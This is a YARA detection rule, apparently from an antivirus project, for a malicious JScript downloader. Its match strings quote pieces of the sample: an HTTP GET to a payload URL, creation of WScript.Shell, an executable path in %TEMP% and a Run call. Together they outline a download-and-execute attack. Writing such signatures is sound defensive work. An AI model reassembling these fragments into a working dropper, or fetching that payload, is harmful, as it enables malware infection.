rule sig_20160401_393f6c2f35b9ddfb5840944ce6fc6312 {
  meta:
    description = "datamaliciousorder - file 20160401_393f6c2f35b9ddfb5840944ce6fc6312.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "267538443c6282e2141a0e034cfc65a2c3b54bf6fc6517e9f43eab494e032250"

  strings:
    $s1  = "TxsOn[RkCwj](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "var KyFe = function AhvDp() {return WScript[IrrYwr](\"WScript\"+\".Shell\");}(), EfjUs = 11;" fullword ascii
    $s3  = "function ExUz(WuMc, DlVk){TrSlg = TrSlg * 1; return WuMc - DlVk;};" fullword ascii
    $s4  = "if (TxsOn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IwRb(){return LgOh + \"\";};" fullword ascii
    $s6  = "function GyGgd() {return KyFe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"noDJi3vqzQnG8I.ex\" + \"e\";};" fullword ascii
    $s7  = "function QziZgk() {return ((SubOo == true) && (SubOo == XnpWoz)) ? 1 : TrSlg;};" fullword ascii
    $s8  = "function BeeLiq()" fullword ascii
    $s9  = "var SubOo = false;" fullword ascii
    $s10 = "var GwjIxf = new this[\"Date\"]();" fullword ascii
    $s11 = "function DyXrm(){return 23;};" fullword ascii
    $s12 = "function WlgSy(){return IrrYwr;};" fullword ascii
    $s13 = "}while (FjwBtk);" fullword ascii
    $s14 = "var VjCy = false;" fullword ascii
    $s15 = "SubOo = true; " fullword ascii
    $s16 = "var XnpWoz = false;" fullword ascii
    $s17 = "return ExUz(IrrJc, ViVp);" fullword ascii
    $s18 = "function QtdEo(RmbSr){KyFe[\"R\"+\"un\"](RmbSr, TrSlg, TrSlg);};" fullword ascii
    $s19 = "function XyyMag(SqlYjx) {var CxWgv = (1, 2, 3, 4, 5, SqlYjx); return CxWgv;};" fullword ascii
    $s20 = "XnpWoz = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}